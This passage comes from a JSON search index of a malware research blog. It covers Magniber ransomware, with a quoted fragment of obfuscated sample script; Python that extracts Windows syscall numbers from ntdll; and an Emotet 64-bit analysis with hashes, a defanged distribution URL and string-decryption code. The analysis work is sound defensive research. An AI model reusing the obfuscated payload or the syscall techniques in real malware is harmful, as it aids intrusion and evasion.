80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[13]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[8]+c7gs9b80[8]+c7gs9b80[51]+c7gs9b80[10]+c7gs9b80[2]+c7gs9b80[29]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[10]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[15]+c7gs9b80[5]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[55]+c7gs9b80[27]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[26]+c7gs9b80[10]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[41]+c7gs9b80[2]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[8]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[48]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[35]+c7gs9b80[48]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[32]+c7gs9b80[3]+c7gs9b80[14]+c7gs9b80[41]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[1]+c7gs9b80[47]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[15]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[41]+c7gs9b80[28]+c7gs9b80[17]);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; .",
            "url": "https://research.openanalysis.net/magniber/malware/research/syscalls/ransomware/2022/05/06/MagniberRansomware.html",
            "relUrl": "/magniber/malware/research/syscalls/ransomware/2022/05/06/MagniberRansomware.html",
            "date": " ‚Ä¢ May 6, 2022"
        }
        
    
  
    
        ,"post51": {
            "title": "Syscall Reversing",
            "content": "Overview . When we are dealing with syscalls we need to be able to generate a syscall table from ntdll.dll that the sample is run with. The syscalls will vary between versions (DLL versions). . Ransomware Example . Magniber | Threat Analysis Report: PrintNightmare and Magniber Ransomware | . import pefile import struct import re pe = pefile.PE(&#39;/tmp/ntdll.dll&#39;) pe_data = open(&#39;/tmp/ntdll.dll&#39;,&#39;rb&#39;).read() . pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY[&#39;IMAGE_DIRECTORY_ENTRY_EXPORT&#39;]]) exports = [] for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: export_address = exp.address export_name = exp.name export_ord = exp.ordinal exports.append({&#39;name&#39;:export_name, &#39;ord&#39;:export_ord, &#39;address&#39;:export_address}) . for export in exports: if b&#39;ZwQueryEaFile&#39; == export.get(&#39;name&#39;): break export_name = export.get(&#39;name&#39;).decode(&#39;utf-8&#39;) export_offset = pe.get_offset_from_rva(export.get(&#39;address&#39;)) print(f&quot;{export_name} {hex(export_offset)}&quot;) syscall_offset = pe_data.find(b&#39; x0f 05 xc3&#39;, export_offset) print(f&quot;Syscall offset: {hex(syscall_offset)}&quot;) match = re.search(rb&#39; xB8(..) x00 x00&#39;, pe_data[export_offset:syscall_offset]) if match: syscall_number = struct.unpack(&#39;&lt;H&#39;, match.group(1))[0] print(f&quot;Syscall: {hex(syscall_number)}&quot;) . ZwQueryEaFile 0xa1210 Syscall offset: 0xa1222 Syscall: 0x13e . syscalls = {} for export in exports: if export.get(&#39;name&#39;) is not None and b&#39;Zw&#39; == export.get(&#39;name&#39;)[:2]: export_name = export.get(&#39;name&#39;).decode(&#39;utf-8&#39;) export_offset = pe.get_offset_from_rva(export.get(&#39;address&#39;)) syscall_offset = pe_data.find(b&#39; x0f 05 xc3&#39;, export_offset) if syscall_offset == -1: print(f&quot;ERROR no sycall found for export {export_name}&quot;) continue match = re.search(rb&#39; xB8(..) x00 x00&#39;, pe_data[export_offset:syscall_offset], re.DOTALL) if match is None: print(f&quot;ERROR no sycall number for export {export_name}&quot;) continue syscall_number = struct.unpack(&#39;&lt;H&#39;, match.group(1))[0] syscalls[export_name] = syscall_number print(&quot;enum syscalls{&quot;) for export in syscalls: print(f&quot;sys_{export} = {syscalls[export]},&quot;) print(&quot;};&quot;) . enum syscalls{ sys_ZwAcceptConnectPort = 2, sys_ZwAccessCheck = 0, sys_ZwAccessCheckAndAuditAlarm = 41, sys_ZwAccessCheckByType = 99, sys_ZwAccessCheckByTypeAndAuditAlarm = 89, sys_ZwAccessCheckByTypeResultList = 100, sys_ZwAccessCheckByTypeResultListAndAuditAlarm = 101, sys_ZwAccessCheckByTypeResultListAndAuditAlarmByHandle = 102, sys_ZwAcquireProcessActivityReference = 103, sys_ZwAddAtom = 71, sys_ZwAddAtomEx = 104, sys_ZwAddBootEntry = 105, sys_ZwAddDriverEntry = 106, sys_ZwAdjustGroupsToken = 107, sys_ZwAdjustPrivilegesToken = 65, sys_ZwAdjustTokenClaimsAndDeviceGroups = 108, sys_ZwAlertResumeThread = 109, sys_ZwAlertThread = 110, sys_ZwAlertThreadByThreadId = 111, sys_ZwAllocateLocallyUniqueId = 112, sys_ZwAllocateReserveObject = 113, sys_ZwAllocateUserPhysicalPages = 114, sys_ZwAllocateUuids = 115, sys_ZwAllocateVirtualMemory = 24, sys_ZwAllocateVirtualMemoryEx = 116, sys_ZwAlpcAcceptConnectPort = 117, sys_ZwAlpcCancelMessage = 118, sys_ZwAlpcConnectPort = 119, sys_ZwAlpcConnectPortEx = 120, sys_ZwAlpcCreatePort = 121, sys_ZwAlpcCreatePortSection = 122, sys_ZwAlpcCreateResourceReserve = 123, sys_ZwAlpcCreateSectionView = 124, sys_ZwAlpcCreateSecurityContext = 125, sys_ZwAlpcDeletePortSection = 126, sys_ZwAlpcDeleteResourceReserve = 127, sys_ZwAlpcDeleteSectionView = 128, sys_ZwAlpcDeleteSecurityContext = 129, sys_ZwAlpcDisconnectPort = 130, sys_ZwAlpcImpersonateClientContainerOfPort = 131, sys_ZwAlpcImpersonateClientOfPort = 132, sys_ZwAlpcOpenSenderProcess = 133, sys_ZwAlpcOpenSenderThread = 134, sys_ZwAlpcQueryInformation = 135, sys_ZwAlpcQueryInformationMessage = 136, sys_ZwAlpcRevokeSecurityContext = 137, sys_ZwAlpcSendWaitReceivePort = 138, sys_ZwAlpcSetInformation = 139, sys_ZwApphelpCacheControl = 76, sys_ZwAreMappedFilesTheSame = 140, sys_ZwAssignProcessToJobObject = 141, sys_ZwAssociateWaitCompletionPacket = 142, sys_ZwCallEnclave = 143, sys_ZwCallbackReturn = 5, sys_ZwCancelIoFile = 93, sys_ZwCancelIoFileEx = 144, sys_ZwCancelSynchronousIoFile = 145, sys_ZwCancelTimer = 97, sys_ZwCancelTimer2 = 146, sys_ZwCancelWaitCompletionPacket = 147, sys_ZwClearEvent = 62, sys_ZwClose = 15, sys_ZwCloseObjectAuditAlarm = 59, sys_ZwCommitComplete = 148, sys_ZwCommitEnlistment = 149, sys_ZwCommitRegistryTransaction = 150, sys_ZwCommitTransaction = 151, sys_ZwCompactKeys = 152, sys_ZwCompareObjects = 153, sys_ZwCompareSigningLevels = 154, sys_ZwCompareTokens = 155, sys_ZwCompleteConnectPort = 156, sys_ZwCompressKey = 157, sys_ZwConnectPort = 158, sys_ZwContinue = 67, sys_ZwConvertBetweenAuxiliaryCounterAndPerformanceCounter = 159, sys_ZwCreateDebugObject = 160, sys_ZwCreateDirectoryObject = 161, sys_ZwCreateDirectoryObjectEx = 162, sys_ZwCreateEnclave = 163, sys_ZwCreateEnlistment = 164, sys_ZwCreateEvent = 72, sys_ZwCreateEventPair = 165, sys_ZwCreateFile = 85, sys_ZwCreateIRTimer = 166, sys_ZwCreateIoCompletion = 167, sys_ZwCreateJobObject = 168, sys_ZwCreateJobSet = 169, sys_ZwCreateKey = 29, sys_ZwCreateKeyTransacted = 170, sys_ZwCreateKeyedEvent = 171, sys_ZwCreateLowBoxToken = 172, sys_ZwCreateMailslotFile = 173, sys_ZwCreateMutant = 174, sys_ZwCreateNamedPipeFile = 175, sys_ZwCreatePagingFile = 176, sys_ZwCreatePartition = 177, sys_ZwCreatePort = 178, sys_ZwCreatePrivateNamespace = 179, sys_ZwCreateProcess = 180, sys_ZwCreateProcessEx = 77, sys_ZwCreateProfile = 181, sys_ZwCreateProfileEx = 182, sys_ZwCreateRegistryTransaction = 183, sys_ZwCreateResourceManager = 184, sys_ZwCreateSection = 74, sys_ZwCreateSectionEx = 185, sys_ZwCreateSemaphore = 186, sys_ZwCreateSymbolicLinkObject = 187, sys_ZwCreateThread = 78, sys_ZwCreateThreadEx = 188, sys_ZwCreateTimer = 189, sys_ZwCreateTimer2 = 190, sys_ZwCreateToken = 191, sys_ZwCreateTokenEx = 192, sys_ZwCreateTransaction = 193, sys_ZwCreateTransactionManager = 194, sys_ZwCreateUserProcess = 195, sys_ZwCreateWaitCompletionPacket = 196, sys_ZwCreateWaitablePort = 197, sys_ZwCreateWnfStateName = 198, sys_ZwCreateWorkerFactory = 199, sys_ZwDebugActiveProcess = 200, sys_ZwDebugContinue = 201, sys_ZwDelayExecution = 52, sys_ZwDeleteAtom = 202, sys_ZwDeleteBootEntry = 203, sys_ZwDeleteDriverEntry = 204, sys_ZwDeleteFile = 205, sys_ZwDeleteKey = 206, sys_ZwDeleteObjectAuditAlarm = 207, sys_ZwDeletePrivateNamespace = 208, sys_ZwDeleteValueKey = 209, sys_ZwDeleteWnfStateData = 210, sys_ZwDeleteWnfStateName = 211, sys_ZwDeviceIoControlFile = 7, sys_ZwDisableLastKnownGood = 212, sys_ZwDisplayString = 213, sys_ZwDrawText = 214, sys_ZwDuplicateObject = 60, sys_ZwDuplicateToken = 66, sys_ZwEnableLastKnownGood = 215, sys_ZwEnumerateBootEntries = 216, sys_ZwEnumerateDriverEntries = 217, sys_ZwEnumerateKey = 50, sys_ZwEnumerateSystemEnvironmentValuesEx = 218, sys_ZwEnumerateTransactionObject = 219, sys_ZwEnumerateValueKey = 19, sys_ZwExtendSection = 220, sys_ZwFilterBootOption = 221, sys_ZwFilterToken = 222, sys_ZwFilterTokenEx = 223, sys_ZwFindAtom = 20, sys_ZwFlushBuffersFile = 75, sys_ZwFlushBuffersFileEx = 224, sys_ZwFlushInstallUILanguage = 225, sys_ZwFlushInstructionCache = 226, sys_ZwFlushKey = 227, sys_ZwFlushProcessWriteBuffers = 228, sys_ZwFlushVirtualMemory = 229, sys_ZwFlushWriteBuffer = 230, sys_ZwFreeUserPhysicalPages = 231, sys_ZwFreeVirtualMemory = 30, sys_ZwFreezeRegistry = 232, sys_ZwFreezeTransactions = 233, sys_ZwFsControlFile = 57, sys_ZwGetCachedSigningLevel = 234, sys_ZwGetCompleteWnfStateSubscription = 235, sys_ZwGetContextThread = 236, sys_ZwGetCurrentProcessorNumber = 237, sys_ZwGetCurrentProcessorNumberEx = 238, sys_ZwGetDevicePowerState = 239, sys_ZwGetMUIRegistryInfo = 240, sys_ZwGetNextProcess = 241, sys_ZwGetNextThread = 242, sys_ZwGetNlsSectionPtr = 243, sys_ZwGetNotificationResourceManager = 244, sys_ZwGetWriteWatch = 245, sys_ZwImpersonateAnonymousToken = 246, sys_ZwImpersonateClientOfPort = 31, sys_ZwImpersonateThread = 247, sys_ZwInitializeEnclave = 248, sys_ZwInitializeNlsFiles = 249, sys_ZwInitializeRegistry = 250, sys_ZwInitiatePowerAction = 251, sys_ZwIsProcessInJob = 79, sys_ZwIsSystemResumeAutomatic = 252, sys_ZwIsUILanguageComitted = 253, sys_ZwListenPort = 254, sys_ZwLoadDriver = 255, sys_ZwLoadEnclaveData = 256, sys_ZwLoadKey = 257, sys_ZwLoadKey2 = 258, sys_ZwLoadKeyEx = 259, sys_ZwLockFile = 260, sys_ZwLockProductActivationKeys = 261, sys_ZwLockRegistryKey = 262, sys_ZwLockVirtualMemory = 263, sys_ZwMakePermanentObject = 264, sys_ZwMakeTemporaryObject = 265, sys_ZwManageHotPatch = 266, sys_ZwManagePartition = 267, sys_ZwMapCMFModule = 268, sys_ZwMapUserPhysicalPages = 269, sys_ZwMapUserPhysicalPagesScatter = 3, sys_ZwMapViewOfSection = 40, sys_ZwMapViewOfSectionEx = 270, sys_ZwModifyBootEntry = 271, sys_ZwModifyDriverEntry = 272, sys_ZwNotifyChangeDirectoryFile = 273, sys_ZwNotifyChangeDirectoryFileEx = 274, sys_ZwNotifyChangeKey = 275, sys_ZwNotifyChangeMultipleKeys = 276, sys_ZwNotifyChangeSession = 277, sys_ZwOpenDirectoryObject = 88, sys_ZwOpenEnlistment = 278, sys_ZwOpenEvent = 64, sys_ZwOpenEventPair = 279, sys_ZwOpenFile = 51, sys_ZwOpenIoCompletion = 280, sys_ZwOpenJobObject = 281, sys_ZwOpenKey = 18, sys_ZwOpenKeyEx = 282, sys_ZwOpenKeyTransacted = 283, sys_ZwOpenKeyTransactedEx = 284, sys_ZwOpenKeyedEvent = 285, sys_ZwOpenMutant = 286, sys_ZwOpenObjectAuditAlarm = 287, sys_ZwOpenPartition = 288, sys_ZwOpenPrivateNamespace = 289, sys_ZwOpenProcess = 38, sys_ZwOpenProcessToken = 290, sys_ZwOpenProcessTokenEx = 48, sys_ZwOpenRegistryTransaction = 291, sys_ZwOpenResourceManager = 292, sys_ZwOpenSection = 55, sys_ZwOpenSemaphore = 293, sys_ZwOpenSession = 294, sys_ZwOpenSymbolicLinkObject = 295, sys_ZwOpenThread = 296, sys_ZwOpenThreadToken = 36, sys_ZwOpenThreadTokenEx = 47, sys_ZwOpenTimer = 297, sys_ZwOpenTransaction = 298, sys_ZwOpenTransactionManager = 299, sys_ZwPlugPlayControl = 300, sys_ZwPowerInformation = 95, sys_ZwPrePrepareComplete = 301, sys_ZwPrePrepareEnlistment = 302, sys_ZwPrepareComplete = 303, sys_ZwPrepareEnlistment = 304, sys_ZwPrivilegeCheck = 305, sys_ZwPrivilegeObjectAuditAlarm = 306, sys_ZwPrivilegedServiceAuditAlarm = 307, sys_ZwPropagationComplete = 308, sys_ZwPropagationFailed = 309, sys_ZwProtectVirtualMemory = 80, sys_ZwPulseEvent = 310, sys_ZwQueryAttributesFile = 61, sys_ZwQueryAuxiliaryCounterFrequency = 311, sys_ZwQueryBootEntryOrder = 312, sys_ZwQueryBootOptions = 313, sys_ZwQueryDebugFilterState = 314, sys_ZwQueryDefaultLocale = 21, sys_ZwQueryDefaultUILanguage = 68, sys_ZwQueryDirectoryFile = 53, sys_ZwQueryDirectoryFileEx = 315, sys_ZwQueryDirectoryObject = 316, sys_ZwQueryDriverEntryOrder = 317, sys_ZwQueryEaFile = 318, sys_ZwQueryEvent = 86, sys_ZwQueryFullAttributesFile = 319, sys_ZwQueryInformationAtom = 320, sys_ZwQueryInformationByName = 321, sys_ZwQueryInformationEnlistment = 322, sys_ZwQueryInformationFile = 17, sys_ZwQueryInformationJobObject = 323, sys_ZwQueryInformationPort = 324, sys_ZwQueryInformationProcess = 25, sys_ZwQueryInformationResourceManager = 325, sys_ZwQueryInformationThread = 37, sys_ZwQueryInformationToken = 33, sys_ZwQueryInformationTransaction = 326, sys_ZwQueryInformationTransactionManager = 327, sys_ZwQueryInformationWorkerFactory = 328, sys_ZwQueryInstallUILanguage = 329, sys_ZwQueryIntervalProfile = 330, sys_ZwQueryIoCompletion = 331, sys_ZwQueryKey = 22, sys_ZwQueryLicenseValue = 332, sys_ZwQueryMultipleValueKey = 333, sys_ZwQueryMutant = 334, sys_ZwQueryObject = 16, sys_ZwQueryOpenSubKeys = 335, sys_ZwQueryOpenSubKeysEx = 336, sys_ZwQueryPerformanceCounter = 49, sys_ZwQueryPortInformationProcess = 337, sys_ZwQueryQuotaInformationFile = 338, sys_ZwQuerySection = 81, sys_ZwQuerySecurityAttributesToken = 339, sys_ZwQuerySecurityObject = 340, sys_ZwQuerySecurityPolicy = 341, sys_ZwQuerySemaphore = 342, sys_ZwQuerySymbolicLinkObject = 343, sys_ZwQuerySystemEnvironmentValue = 344, sys_ZwQuerySystemEnvironmentValueEx = 345, sys_ZwQuerySystemInformation = 54, sys_ZwQuerySystemInformationEx = 346, sys_ZwQuerySystemTime = 91, sys_ZwQueryTimer = 56, sys_ZwQueryTimerResolution = 347, sys_ZwQueryValueKey = 23, sys_ZwQueryVirtualMemory = 35, sys_ZwQueryVolumeInformationFile = 73, sys_ZwQueryWnfStateData = 348, sys_ZwQueryWnfStateNameInformation = 349, sys_ZwQueueApcThread = 69, sys_ZwQueueApcThreadEx = 350, sys_ZwRaiseException = 351, sys_ZwRaiseHardError = 352, sys_ZwReadFile = 6, sys_ZwReadFileScatter = 46, sys_ZwReadOnlyEnlistment = 353, sys_ZwReadRequestData = 84, sys_ZwReadVirtualMemory = 63, sys_ZwRecoverEnlistment = 354, sys_ZwRecoverResourceManager = 355, sys_ZwRecoverTransactionManager = 356, sys_ZwRegisterProtocolAddressInformation = 357, sys_ZwRegisterThreadTerminatePort = 358, sys_ZwReleaseKeyedEvent = 359, sys_ZwReleaseMutant = 32, sys_ZwReleaseSemaphore = 10, sys_ZwReleaseWorkerFactoryWorker = 360, sys_ZwRemoveIoCompletion = 9, sys_ZwRemoveIoCompletionEx = 361, sys_ZwRemoveProcessDebug = 362, sys_ZwRenameKey = 363, sys_ZwRenameTransactionManager = 364, sys_ZwReplaceKey = 365, sys_ZwReplacePartitionUnit = 366, sys_ZwReplyPort = 12, sys_ZwReplyWaitReceivePort = 11, sys_ZwReplyWaitReceivePortEx = 43, sys_ZwReplyWaitReplyPort = 367, sys_ZwRequestPort = 368, sys_ZwRequestWaitReplyPort = 34, sys_ZwResetEvent = 369, sys_ZwResetWriteWatch = 370, sys_ZwRestoreKey = 371, sys_ZwResumeProcess = 372, sys_ZwResumeThread = 82, sys_ZwRevertContainerImpersonation = 373, sys_ZwRollbackComplete = 374, sys_ZwRollbackEnlistment = 375, sys_ZwRollbackRegistryTransaction = 376, sys_ZwRollbackTransaction = 377, sys_ZwRollforwardTransactionManager = 378, sys_ZwSaveKey = 379, sys_ZwSaveKeyEx = 380, sys_ZwSaveMergedKeys = 381, sys_ZwSecureConnectPort = 382, sys_ZwSerializeBoot = 383, sys_ZwSetBootEntryOrder = 384, sys_ZwSetBootOptions = 385, sys_ZwSetCachedSigningLevel = 386, sys_ZwSetCachedSigningLevel2 = 387, sys_ZwSetContextThread = 388, sys_ZwSetDebugFilterState = 389, sys_ZwSetDefaultHardErrorPort = 390, sys_ZwSetDefaultLocale = 391, sys_ZwSetDefaultUILanguage = 392, sys_ZwSetDriverEntryOrder = 393, sys_ZwSetEaFile = 394, sys_ZwSetEvent = 14, sys_ZwSetEventBoostPriority = 45, sys_ZwSetHighEventPair = 395, sys_ZwSetHighWaitLowEventPair = 396, sys_ZwSetIRTimer = 397, sys_ZwSetInformationDebugObject = 398, sys_ZwSetInformationEnlistment = 399, sys_ZwSetInformationFile = 39, sys_ZwSetInformationJobObject = 400, sys_ZwSetInformationKey = 401, sys_ZwSetInformationObject = 92, sys_ZwSetInformationProcess = 28, sys_ZwSetInformationResourceManager = 402, sys_ZwSetInformationSymbolicLink = 403, sys_ZwSetInformationThread = 13, sys_ZwSetInformationToken = 404, sys_ZwSetInformationTransaction = 405, sys_ZwSetInformationTransactionManager = 406, sys_ZwSetInformationVirtualMemory = 407, sys_ZwSetInformationWorkerFactory = 408, sys_ZwSetIntervalProfile = 409, sys_ZwSetIoCompletion = 410, sys_ZwSetIoCompletionEx = 411, sys_ZwSetLdtEntries = 412, sys_ZwSetLowEventPair = 413, sys_ZwSetLowWaitHighEventPair = 414, sys_ZwSetQuotaInformationFile = 415, sys_ZwSetSecurityObject = 416, sys_ZwSetSystemEnvironmentValue = 417, sys_ZwSetSystemEnvironmentValueEx = 418, sys_ZwSetSystemInformation = 419, sys_ZwSetSystemPowerState = 420, sys_ZwSetSystemTime = 421, sys_ZwSetThreadExecutionState = 422, sys_ZwSetTimer = 98, sys_ZwSetTimer2 = 423, sys_ZwSetTimerEx = 424, sys_ZwSetTimerResolution = 425, sys_ZwSetUuidSeed = 426, sys_ZwSetValueKey = 96, sys_ZwSetVolumeInformationFile = 427, sys_ZwSetWnfProcessNotificationEvent = 428, sys_ZwShutdownSystem = 429, sys_ZwShutdownWorkerFactory = 430, sys_ZwSignalAndWaitForSingleObject = 431, sys_ZwSinglePhaseReject = 432, sys_ZwStartProfile = 433, sys_ZwStopProfile = 434, sys_ZwSubscribeWnfStateChange = 435, sys_ZwSuspendProcess = 436, sys_ZwSuspendThread = 437, sys_ZwSystemDebugControl = 438, sys_ZwTerminateEnclave = 439, sys_ZwTerminateJobObject = 440, sys_ZwTerminateProcess = 44, sys_ZwTerminateThread = 83, sys_ZwTestAlert = 441, sys_ZwThawRegistry = 442, sys_ZwThawTransactions = 443, sys_ZwTraceControl = 444, sys_ZwTraceEvent = 94, sys_ZwTranslateFilePath = 445, sys_ZwUmsThreadYield = 446, sys_ZwUnloadDriver = 447, sys_ZwUnloadKey = 448, sys_ZwUnloadKey2 = 449, sys_ZwUnloadKeyEx = 450, sys_ZwUnlockFile = 451, sys_ZwUnlockVirtualMemory = 452, sys_ZwUnmapViewOfSection = 42, sys_ZwUnmapViewOfSectionEx = 453, sys_ZwUnsubscribeWnfStateChange = 454, sys_ZwUpdateWnfStateData = 455, sys_ZwVdmControl = 456, sys_ZwWaitForAlertByThreadId = 457, sys_ZwWaitForDebugEvent = 458, sys_ZwWaitForKeyedEvent = 459, sys_ZwWaitForMultipleObjects = 91, sys_ZwWaitForMultipleObjects32 = 26, sys_ZwWaitForSingleObject = 4, sys_ZwWaitForWorkViaWorkerFactory = 460, sys_ZwWaitHighEventPair = 461, sys_ZwWaitLowEventPair = 462, sys_ZwWorkerFactoryWorkerReady = 1, sys_ZwWriteFile = 8, sys_ZwWriteFileGather = 27, sys_ZwWriteRequestData = 87, sys_ZwWriteVirtualMemory = 58, sys_ZwYieldExecution = 70, }; .",
            "url": "https://research.openanalysis.net/magniber/malware/research/syscalls/ransomware/2022/05/03/syscall_reversing.html",
            "relUrl": "/magniber/malware/research/syscalls/ransomware/2022/05/03/syscall_reversing.html",
            "date": " ‚Ä¢ May 3, 2022"
        }
        
    
  
    
        ,"post52": {
            "title": "Emotet 64-bit",
            "content": "Overview . We are going to take a look at the new Emotet 64-bit samples and see if we can generate a Yara rule and a config extractor. . Samples . Packed (b481ac05ea9a59eedf6233166327057279babef26c913a8e89536472b192e86c) | Unpacked (ed2640be5ed0a4486ecf7ac97b125e26b9d263624251eae1c9a42e9998ca1e68) The PS1 has zero detections on VT üëÄDistro compromised URL:hxxp://ciencias-exactas[.]com[.]ar/old/w/#Emotet DLL payload, MD5: 71675a9a8abbce8ba524f8f6ef3735ed pic.twitter.com/95Na6SzguN . &mdash; Max_Malyutin (@Max_Mal_) April 28, 2022 üö®#Emotet Updateüö® - Looks like Ivan laid an egg for easter and has been busy. As of about 14:00UTC today 2022/04/18 - Emotet on Epoch 4 has switched over to using 64-bit loaders and stealer modules. Previously everything was 32-bit except for occasional loader shenanigans. 1/x . &mdash; Cryptolaemus (@Cryptolaemus1) April 19, 2022 ### References | Yara rule plugin for IDA/Binja/Cutter | @MaxMal emotet delivery analysis | Emotet botnet switches to 64-bit modules, increases activity | EmoCheck now detects new 64-bit versions of Emotet malware | Emotet Tests New Delivery Techniques | Malpedia Emotet Info (Yara) | . Initial Triage . Payload Binary Overview . DLL with DllRegisterServer export (ord 1) | compiler is MASM | internal name Y.dll | . Code . using the same llvm control flow flattening obfuscator as the 32-bit versions | obscuring function calls by passing constants that are not used | we have some encrypted strings in the .text section | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . String Decryption . The string decrypion works the same way as 32-bit emotet where the first DWORD is the key, the second DWORD is the encrypted string lenght, and the encrypted string follows. We can use the same code. . The strings table starts at the beginning of the .text section. . We can reuse our 32-bit string decryptor with some slight modificaitons. . import struct import pefile EMOTET_FILE = r&#39;/tmp/work/emotet_b481_unpacked.bin&#39; data = open(EMOTET_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) txt_data = None for s in pe.sections: if b&#39;.text&#39; in s.Name: txt_data = s.get_data() # Make sure we got the text section assert txt_data is not None # Strings are xor encrypted def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def is_ascii(s): return all(c &lt; 128 for c in s) strings_table = [] ECS1_string = None ECK1_string = None # Check for the strings in the first 0x1000 bytes of the text section for i in range(0,0x1000,4): candidate_1 = struct.unpack(&#39;&lt;I&#39;,txt_data[i:i+4])[0] candidate_2 = struct.unpack(&#39;&lt;I&#39;,txt_data[i+4:i+8])[0] if (candidate_1 &amp; 0xffffff00) ^ (candidate_2 &amp; 0xffffff00) == 0: # We have a match! key = txt_data[i:i+4] data_len = candidate_1 ^ candidate_2 enc_data = txt_data[i+8:i+8+data_len] ptxt_data = xor_decrypt(enc_data, key) if is_ascii(ptxt_data): if ptxt_data != b&#39;&#39;: strings_table.append(ptxt_data.decode(&#39;latin1&#39;)) if b&#39;ECS1&#39; == ptxt_data[:4]: ECS1_string = ptxt_data if b&#39;ECK1&#39; == ptxt_data[:4]: ECK1_string = ptxt_data # Print our strings print(ECS1_string) print(ECK1_string) for s in strings_table: print(s) . b&#39;ECS1 x00 x00 x00@_t xb6 xc4 xd8 xdc x0c= x1f x06z7 xdc xb9 xf9 xb7 xbd^ x8a/ xa6 xa1 xf2 x0f xa1y r x14 xe5 xf51 xe8 xb0 n x1e&lt; x8b?{ x90 x1d&amp;&amp;1 x86e| x1a xad xd9 xc3 xacH xf0` x87 x18 xd9t&lt;X xf9&#39; b&#39;ECK1 x00 x00 x00 xf3 xa35 xb5 x0e.+ xf45V xcd nL)&gt;| xf1 x10 xdd xcb xb0O xb3 xfa x02 xceL xb6 x0c x1eD x96 xbe xb4 x0e xe6 xc9[ x9a 